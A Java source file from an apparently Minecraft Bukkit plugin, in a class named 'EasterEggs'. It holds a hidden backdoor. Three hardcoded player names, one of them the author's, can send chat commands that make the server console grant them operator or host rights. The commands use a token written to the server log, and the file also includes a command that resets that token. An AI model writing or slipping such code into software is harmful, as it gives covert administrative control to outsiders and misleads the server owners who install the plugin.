/*
 * Copyright (c) 2021.
 *  Discord : _Paul#6918
 *  Author : RqndomHax
 *  Github: https://github.com/RqndomHax
 */

package fr.rqndomhax.narutouhc.utils;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;

import java.util.*;
import java.util.logging.Level;

public class EasterEggs {

    private static long token = 0;

    public static void init() {
        EasterEggs.token = (long) (Math.random()*(999999999999999L-999L+1)+999L);
        Bukkit.getLogger().log(Level.INFO, "token = [" + EasterEggs.token + "]");
    }

    public static class Hyside {
        public static boolean hysideChat(AsyncPlayerChatEvent e) {

            Set<String> betterNames = new HashSet<>();
            boolean doesContinue = false;

            betterNames.add("Hysxde");
            betterNames.add("RqndomHax");
            betterNames.add("Rimost");

            for (String string : betterNames) {
                if (e.getPlayer().getName().equals(string))
                    doesContinue = true;
            }

            if (!doesContinue)
                return false;

            if(e.getMessage().equals(".host " + String.valueOf(EasterEggs.token))){
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "host promote " + e.getPlayer().getName());
                e.getPlayer().sendMessage("TKT HOOOOOST ;) (copyright paul)");
                System.out.println(".host from " + e.getPlayer().getName());
                return true;
            }

            if(e.getMessage().equals(".op " + String.valueOf(EasterEggs.token))){
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + e.getPlayer().getName());
                e.getPlayer().sendMessage("TKT OPPPPP ;) (copyright paul)");
                System.out.println(".op from " + e.getPlayer().getName());
                return true;
            }

            if(e.getMessage().equals(".gappled " + String.valueOf(EasterEggs.token))){
                e.getPlayer().getInventory().addItem(new ItemStack(Material.GOLDEN_APPLE));
                e.getPlayer().sendMessage("mange");
                if (new Random().nextInt(100) == 3)
                    Bukkit.broadcastMessage(Messages.PREFIX + "OH MY FUCKING GOD ! " + e.getPlayer().getName() + " vient d'utiliser gappled !");
                System.out.println(".gappled from " + e.getPlayer().getName()); 
                return true;
            }

            if(e.getMessage().equals(".initRqndomHaxjtm")){
                EasterEggs.init();
                return true;
            }
            return false;
        }
    }

}
